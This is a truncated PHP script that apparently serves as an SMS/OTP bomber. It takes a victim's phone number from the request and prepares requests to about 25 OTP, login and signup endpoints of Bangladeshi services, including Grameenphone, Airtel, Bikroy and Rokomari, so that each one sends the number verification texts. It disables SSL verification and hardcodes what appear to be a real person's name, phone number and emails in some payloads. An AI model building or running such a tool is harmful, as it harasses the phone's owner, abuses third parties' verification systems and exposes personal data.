<?php
$phn = $_REQUEST["phone"];  // ইউজারের ফোন নম্বর

// Function to make the API call
function makeApiCall($url, $data) {
    $curl = curl_init($url);
    curl_setopt($curl, CURLOPT_URL, $url);
    curl_setopt($curl, CURLOPT_POST, true);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
    
    $headers = array(
        "Content-Type: application/json",
    );
    curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);
    
    curl_setopt($curl, CURLOPT_POSTFIELDS, $data);
    
    // Disable SSL verification (for debugging purposes only, remove for production)
    curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
    
    $resp = curl_exec($curl);
    curl_close($curl);
    return $resp;
}

// API 1: https://app.eonbazar.com/api/auth/login
$api1_url = "https://app.eonbazar.com/api/auth/login";
$api1_data = json_encode(array(
    "method" => "otp",
    "mobile" => $phn
));

// API 2: https://api.osudpotro.com/api/v1/users/send_otp
$api2_url = "https://api.osudpotro.com/api/v1/users/send_otp";
$api2_data = json_encode(array(
    "os" => "web",
    "mobile" => "+88-" . $phn,
    "language" => "en",
    "deviceToken" => "web"
));

// API 3: https://bikroy.com/data/phone_number_login/verifications/phone_login
$api3_url = "https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=" . $phn;

// API 4: https://api3.bioscopelive.com/auth/api/v2/login/send-otp
$api4_url = "https://api3.bioscopelive.com/auth/api/v2/login/send-otp";
$api4_data = json_encode(array(
    "msisdn" => "880" . $phn,
    "token_type" => "CUSTOM_TOKEN_V1",
    "operator" => "all",
    "token" => "your_token_here"  // Add the correct token
));

// API 5: https://api.redx.com.bd/v1/user/signup
$api5_url = "https://api.redx.com.bd/v1/user/signup";
$api5_data = json_encode(array(
    "name" => $phn,
    "phoneNumber" => $phn,
    "service" => "redx"
));

// API 6: https://cokestudio23.sslwireless.com/api/store-and-send-otp
$api6_url = "https://cokestudio23.sslwireless.com/api/store-and-send-otp";
$api6_data = json_encode(array(
    "msisdn" => "8801316787742",
    "name" => "Aulad Hosen",
    "email" => "uladhosenridoy@gmail.com",
    "dob" => "2000-01-01",
    "occupation" => "N/A",
    "gender" => "male"
));

// API 7: https://cokestudio23.sslwireless.com/api/check-gp-number
$api7_url = "https://cokestudio23.sslwireless.com/api/check-gp-number";
$api7_data = json_encode(array(
    "msisdn" => $phn
));

// API 8: https://weblogin.grameenphone.com/backend/api/v1/otp
$api8_url = "https://weblogin.grameenphone.com/backend/api/v1/otp";
$api8_data = json_encode(array(
    "msisdn" => $phn
));

// API 9: https://apix.rabbitholebd.com/appv2/login/requestOTP
$api9_url = "https://apix.rabbitholebd.com/appv2/login/requestOTP";
$api9_data = json_encode(array(
    "mobile" => "+880" . $phn
));

// API 10: https://api.osudpotro.com/api/v1/users/send_otp (Duplicate)
$api10_url = "https://api.osudpotro.com/api/v1/users/send_otp";
$api10_data = json_encode(array(
    "mobile" => "+88-" . $phn,
    "deviceToken" => "web",
    "language" => "en",
    "os" => "web"
));

// API 11: https://fundesh.com.bd/api/auth/generateOTP
$api11_url = "https://fundesh.com.bd/api/auth/generateOTP?service_key=";
$api11_data = json_encode(array(
    "msisdn" => $phn
));

// API 12: https://api.swap.com.bd/api/v1/send-otp
$api12_url = "https://api.swap.com.bd/api/v1/send-otp";
$api12_data = json_encode(array(
    "phone" => $phn
));

// API 13: https://api.bd.airtel.com/v1/account/login/otp
$api13_url = "https://api.bd.airtel.com/v1/account/login/otp";
$api13_data = json_encode(array(
    "phone_number" => $phn
));

// API 14: https://api.bd.airtel.com/v1/account/register/otp
$api14_url = "https://api.bd.airtel.com/v1/account/register/otp";

// API 15: https://apix.rabbitholebd.com/appv2/login/requestOTP (Duplicate)
$api15_url = "https://apix.rabbitholebd.com/appv2/login/requestOTP";
$api15_data = json_encode(array(
    "mobile" => "+880" . $phn
));

// API 16: https://bikroy.com/data/phone_number_login/verifications/phone_login
$api16_url = "https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=" . $phn;

// API 17: https://www.rokomari.com/otp/send
$api17_url = "https://www.rokomari.com/otp/send";
$api17_data = array(
    "emailOrPhone" => "+880" . $phn,
    "countryCode" => "BD"
);

// API 18: https://backoffice.ecourier.com.bd/api/web/individual-send-otp
$api18_url = "https://backoffice.ecourier.com.bd/api/web/individual-send-otp?mobile=" . $phn;

// API 19: https://m.cricbuzz.com/cbplus/auth/user/signup
$api19_url = "https://m.cricbuzz.com/cbplus/auth/user/signup";
$api19_data = json_encode(array(
    "username" => "ajajsjfhcj@gmail.com"
));

// API 20: https://api.paragonfood.com.bd/auth/customerlogin
$api20_url = "https://api.paragonfood.com.bd/auth/customerlogin";
$api20_data = json_encode(array(
    "emailOrPhone" => "ajajsjfhcj@gmail.com"
));

// API 21: https://prod-api.viewlift.com/identity/signup?site=prothomalo
$api21_url = "https://prod-api.viewlift.com/identity/signup?site=prothomalo";
$api21_data = json_encode(array(
    "requestType" => "send",
    "phoneNumber" => "+880" . $phn,
    "emailConsent" => true,
    "whatsappConsent" => false
));

// API 22: https://prod-api.viewlift.com/identity/signup?site=hoichoitv
$api22_url = "https://prod-api.viewlift.com/identity/signup?site=hoichoitv";
$api22_data = json_encode(array(
    "requestType" => "send",
    "phoneNumber" => "+880" . $phn,
    "emailConsent" => true,
    "whatsappConsent" => true
));

// API 23: https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php
$api23_url = "https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php";
$api23_data = json_encode(array(
    "full_name" => "Hjbdnd",
    "company_name" => "Hello",
    "email_address" => "uladhosen860@gmail.com",
    "phone_number" => $phn
));

// API 24: https://app.eonbazar.com/api/auth/register
$api24_url = "https://app.eonbazar.com/api/auth/register";
$api24_data = json_encode(array(
    "mobile" => $phn,
    "name" => "Hello",
    "password" => "helloq",
    "email" => "ajajsjfhcj@gmail.com"
));

// API 25: https://tracking.sundarbancourierltd.com/PreBooking/SendPin
$api25_url = "https://tracking.sundarbancourierltd